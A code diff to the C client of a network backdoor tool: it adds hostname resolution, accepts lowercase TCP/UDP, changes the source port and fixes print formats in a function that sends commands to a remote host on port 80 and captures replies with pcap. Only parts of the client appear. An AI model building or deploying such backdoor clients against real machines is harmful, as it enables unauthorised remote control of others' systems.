@@ -4,21 +4,24 @@
 
 #include "client.h"
 
-int main (int argc, char * argv[]) {
+int main (int argc, char* argv[]) {
 
-	backdoor_client(argv[1], argv[2]);
+	int ipaddress;
+
+	ipaddress = host_convert(argv[1]);
+
+	backdoor_client((uint32)ipaddress, argv[2]);
 
 	return 0;
 }
 
-void* backdoor_client(uint32 ipaddress, int protocol)
+void backdoor_client(uint32 ipaddress, char* protocol)
 {
 	client *cln;
 	char *cmd;
 	pthread_t pth_id;
-	int ipaddress;
+	//int ipaddress;
 
-	sscanf(ipaddr, "%d", &ipaddress);
 
 	// pcap variables to determine source IP
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -37,7 +40,8 @@ void* backdoor_client(uint32 ipaddress, int protocol)
 		perror("Invalid IP Address");
 	}
 
-	if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)) {
+	if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)
+			&& (strcmp(protocol,"tcp") != 0) && (strcmp(protocol,"udp") != 0)) {
 		perror("Invalid Protocol");
 	}
 
@@ -60,19 +64,19 @@ void* backdoor_client(uint32 ipaddress, int protocol)
 
 	// set client structure
 	cln->source_host = srcip;
-	cln->source_port = 4096;
+	cln->source_port = 4098;
 	cln->dest_host = ipaddress;
 	cln->dest_port = 80;
 
-
+	printf("source ip %u, dest ip: %u \n", srcip, ipaddress);
 
 	/**
 	 * Print out destination host information
 	 */
 	printf("\n\nSending commands to: \n");
 	printf("============================\n\n");
-	printf("Destination	: 	%d:%u\n", cln->dest_host, cln->dest_port);
-	printf("Source		: 	%d:%u\n", cln->source_host, cln->source_port);
+	printf("Destination	: 	%u:%u\n", cln->dest_host, cln->dest_port);
+	printf("Source		: 	%u:%u\n", cln->source_host, cln->source_port);
 
 	printf("\n");
 
@@ -308,5 +312,20 @@ void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
 		fclose(file);
 		//running = false;
 	}
+}
+
+unsigned int host_convert(char *hostname) {
+	static struct in_addr i;
+	struct hostent *h;
+	i.s_addr = inet_addr(hostname);
+	if (i.s_addr == -1) {
+		h = gethostbyname(hostname);
+		if (h == NULL) {
+			fprintf(stderr, "cannot resolve %s\n", hostname);
+			exit(0);
+		}
+		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
+	}
+	return i.s_addr;
 }
 
